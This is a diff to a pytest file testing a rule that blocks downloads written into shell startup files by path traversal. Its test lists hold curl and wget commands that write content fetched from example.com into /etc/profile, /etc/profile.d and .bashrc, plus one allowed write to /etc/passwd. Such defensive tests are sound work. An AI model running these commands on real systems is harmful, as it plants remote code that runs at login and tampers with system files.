@@ -13,15 +13,19 @@ def rule(cmd):
 @pytest.mark.parametrize(
     "cmd",
     [
-        "cd /srv && curl -o ../etc/profile https://example.com/x",
-        "cd /srv/app && curl -o ../../etc/profile https://example.com/x",
+        "cd /opt && curl -o ../etc/profile https://example.com/x",
+        "cd /opt/app && curl -o ../../etc/profile https://example.com/x",
         "cd /tmp && wget -O ../../etc/profile.d/x.sh https://example.com/x",
-        "cd /srv && curl --output ../etc/profile https://example.com/x",
-        "cd /srv && curl https://example.com/x > ../etc/profile",
-        "cd /srv && curl https://example.com/x | tee ../etc/profile",
-        "cd /srv && cd .. && curl -o etc/profile https://example.com/x",
+        "cd /opt && curl --output ../etc/profile https://example.com/x",
+        "cd /opt && curl https://example.com/x > ../etc/profile",
+        "cd /opt && curl https://example.com/x | tee ../etc/profile",
+        "cd /opt && cd .. && curl -o etc/profile https://example.com/x",
         "cd ~ && curl -o .bashrc https://example.com/x",
         "cd ~ && curl -o sub/../.bashrc https://example.com/x",
+        "cd ~ && curl -o ../../etc/profile https://example.com/x",
+        "cd ~ && wget -O ../../etc/profile.d/x.sh https://example.com/x",
+        "cd $HOME && curl -o ../../etc/profile https://example.com/x",
+        "cd ~/app && curl -o ../../../etc/profile https://example.com/x",
     ],
 )
 def test_blocked(cmd):
@@ -31,10 +35,13 @@ def test_blocked(cmd):
 @pytest.mark.parametrize(
     "cmd",
     [
-        "cd /srv/app && curl -o ../data/x.bin https://example.com/x",
-        "cd /srv/app && curl -o ../../etc/hosts.example https://example.com/x",
-        "cd /srv/app/.. && curl -o app/x.bin https://example.com/x",
+        "cd /opt/app && curl -o ../data/x.bin https://example.com/x",
+        "cd /opt/app && curl -o ../../etc/hosts.example https://example.com/x",
+        "cd /opt/app/.. && curl -o app/x.bin https://example.com/x",
         "cd ~ && curl -o ../../etc/passwd https://example.com/x",
+        # Stays inside home, or lands beside it at /home level where nothing is protected.
+        "cd ~/app && curl -o ../data/x.bin https://example.com/x",
+        "cd ~ && curl -o ../other/x.bin https://example.com/x",
         "cd $DIR && curl -o ../etc/profile https://example.com/x",
         "curl -o ../etc/profile https://example.com/x",
         "curl -o notes.txt https://example.com/x",
